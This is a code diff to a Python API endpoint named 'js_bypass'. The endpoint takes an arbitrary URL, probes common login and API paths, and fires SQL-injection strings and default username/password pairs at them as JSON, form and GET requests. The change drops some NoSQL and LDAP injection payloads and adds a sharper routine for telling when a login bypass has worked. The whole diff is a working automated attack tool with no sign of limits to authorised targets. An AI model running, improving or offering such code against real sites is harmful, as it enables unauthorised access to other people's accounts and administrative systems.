@@ -1536,28 +1536,23 @@ def js_bypass(url: str, key: str = Depends(verify_key)):
 
     session = requests.Session()
     session.headers.update({
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Accept": "application/json, text/plain, */*",
-        "Accept-Language": "en-US,en;q=0.9",
         "Content-Type": "application/json"
     })
 
-    # More comprehensive login paths
     login_paths = [
         "/login", "/signin", "/login.php", "/signin.php",
-        "/user/login", "/account/login", "/auth/login", "/auth",
-        "/oauth/login", "/oauth/token", "/authenticate", "/session"
+        "/user/login", "/account/login", "/auth/login"
     ]
 
-    # API endpoints (including GraphQL)
     api_endpoints = [
         "/api/login", "/api/auth", "/api/v1/login", "/api/user/login",
         "/rest/user/login", "/auth/login", "/user/login", "/login.json",
-        "/api/authenticate", "/api/session", "/auth/local", "/api/account/login",
-        "/graphql", "/api/graphql", "/v1/graphql"
+        "/api/authenticate", "/api/session", "/auth/local"
     ]
 
-    # Payloads: SQLi, NoSQL, LDAP, Default creds
+    # SQLi + default creds
     json_payloads = [
         {"username": "' OR '1'='1", "password": "' OR '1'='1"},
         {"email": "' OR '1'='1", "password": "' OR '1'='1"},
@@ -1573,15 +1568,8 @@ def js_bypass(url: str, key: str = Depends(verify_key)):
         {"email": "admin", "password": "123456"},
         {"username": "root", "password": "root"},
         {"username": "test", "password": "test"},
-        # NoSQL injection
-        {"username": {"$ne": None}, "password": {"$ne": None}},
-        {"email": {"$ne": None}, "password": {"$ne": None}},
-        # LDAP injection
-        {"username": "*)(uid=*))(|(uid=*", "password": "*)(uid=*))(|(uid=*"},
-        {"email": "*)(uid=*))(|(uid=*", "password": "*)(uid=*))(|(uid=*"},
     ]
 
-    # Also try form-urlencoded payloads for API endpoints that expect form data
     form_payloads = [
         {"username": "' OR '1'='1", "password": "' OR '1'='1"},
         {"email": "' OR '1'='1", "password": "' OR '1'='1"},
@@ -1591,25 +1579,52 @@ def js_bypass(url: str, key: str = Depends(verify_key)):
         {"email": "admin", "password": "admin"},
     ]
 
+    def is_login_successful(resp, original_url):
+        """Better success detection"""
+        # 1. Redirected to different URL (not same page)
+        if resp.url != original_url and not any(s in resp.url.lower() for s in ["login", "signin"]):
+            return True
+
+        # 2. HTTP status 302 (redirect) – strong indicator
+        if resp.status_code == 302:
+            return True
+
+        # 3. Check for tokens or session in JSON response
+        try:
+            data = resp.json()
+            if any(k in data for k in ["token", "access_token", "session", "user", "success", "authenticated"]):
+                return True
+        except:
+            pass
+
+        # 4. Check page content – but avoid false positives
+        body = resp.text.lower()
+        success_keywords = ["welcome", "dashboard", "logout", "profile", "account", "my account"]
+        fail_keywords = ["invalid", "wrong", "failed", "error", "incorrect", "denied", "login again"]
+
+        has_success = any(k in body for k in success_keywords)
+        has_fail = any(k in body for k in fail_keywords)
+
+        # If both success and fail keywords appear, be cautious – treat as fail
+        if has_success and not has_fail:
+            # But also ensure it's not the login page itself
+            if not any(s in body for s in ["username", "password", "sign in", "login"]):
+                return True
+
+        return False
+
     def try_login_form(form_url, data):
         try:
-            r = session.post(form_url, data=data, timeout=5, allow_redirects=True)
-            body = r.text.lower()
-            return any(s in body for s in ["welcome", "dashboard", "logout", "profile", "success", "token", "session"])
+            r = session.post(form_url, data=data, timeout=5, allow_redirects=False)  # Don't auto-follow redirects
+            return is_login_successful(r, form_url)
         except:
             return False
 
     def try_json_endpoint(endpoint, payload):
         try:
-            r = session.post(endpoint, json=payload, timeout=5)
+            r = session.post(endpoint, json=payload, timeout=5, allow_redirects=False)
             if r.status_code in [200, 302]:
-                try:
-                    resp_json = r.json()
-                    if "token" in resp_json or "success" in resp_json or "user" in resp_json or "session" in resp_json:
-                        return True
-                except:
-                    if "welcome" in r.text.lower() or "dashboard" in r.text.lower() or "token" in r.text.lower():
-                        return True
+                return is_login_successful(r, endpoint)
         except:
             pass
         return False
@@ -1635,7 +1650,6 @@ def js_bypass(url: str, key: str = Depends(verify_key)):
                 if user_field and pass_field:
                     for payload in json_payloads[:10]:
                         test_data = data.copy()
-                        # payload may be dict with username/email or other keys
                         if "username" in payload:
                             test_data[user_field] = payload["username"]
                         elif "email" in payload:
@@ -1653,7 +1667,7 @@ def js_bypass(url: str, key: str = Depends(verify_key)):
                             break
                     if results["bypassed"]:
                         break
-    except:
+    except Exception:
         pass
 
     # ----- Step 2: Try common login paths -----
@@ -1703,13 +1717,12 @@ def js_bypass(url: str, key: str = Depends(verify_key)):
             except:
                 continue
 
-    # ----- Step 3: Try API endpoints (JSON and form) -----
+    # ----- Step 3: Try API endpoints -----
     if not results["bypassed"]:
         parsed = urlparse(url)
         base = f"{parsed.scheme}://{parsed.netloc}"
         for endpoint in api_endpoints:
             api_url = urljoin(base, endpoint)
-            # Try JSON POST
             for payload in json_payloads:
                 if try_json_endpoint(api_url, payload):
                     results["bypassed"].append({"payload": payload, "method": f"json_{endpoint}"})
@@ -1718,11 +1731,10 @@ def js_bypass(url: str, key: str = Depends(verify_key)):
                     break
             if results["bypassed"]:
                 break
-            # Try form-encoded POST
             for payload in form_payloads:
                 try:
-                    r = session.post(api_url, data=payload, timeout=5)
-                    if r.status_code in [200, 302] and ("welcome" in r.text.lower() or "dashboard" in r.text.lower() or "token" in r.text.lower()):
+                    r = session.post(api_url, data=payload, timeout=5, allow_redirects=False)
+                    if is_login_successful(r, api_url):
                         results["bypassed"].append({"payload": payload, "method": f"form_{endpoint}"})
                         results["bypassed_count"] = 1
                         results["method"] = "form_api"
@@ -1732,15 +1744,17 @@ def js_bypass(url: str, key: str = Depends(verify_key)):
             if results["bypassed"]:
                 break
 
-    # ----- Step 4: Try GET injection on API endpoints -----
+    # ----- Step 4: GET injection on API endpoints -----
+    parsed = urlparse(url)
+    base = f"{parsed.scheme}://{parsed.netloc}"
     if not results["bypassed"]:
-        for endpoint in ["/api/users", "/api/admin", "/api/keys", "/graphql", "/api/graphql"]:
+        for endpoint in ["/api/users", "/api/admin", "/api/keys"]:
             test_url = urljoin(base, endpoint)
-            for param in ["username", "email", "id", "user"]:
+            for param in ["username", "email", "id"]:
                 payload = f"?{param}=' OR '1'='1"
                 try:
-                    r = session.get(test_url + payload, timeout=5)
-                    if r.status_code == 200 and ("sql" in r.text.lower() or "error" in r.text.lower()):
+                    r = session.get(test_url + payload, timeout=5, allow_redirects=False)
+                    if is_login_successful(r, test_url):
                         results["bypassed"].append({"method": f"get_injection_{endpoint}"})
                         results["bypassed_count"] = 1
                         results["method"] = "get_injection"
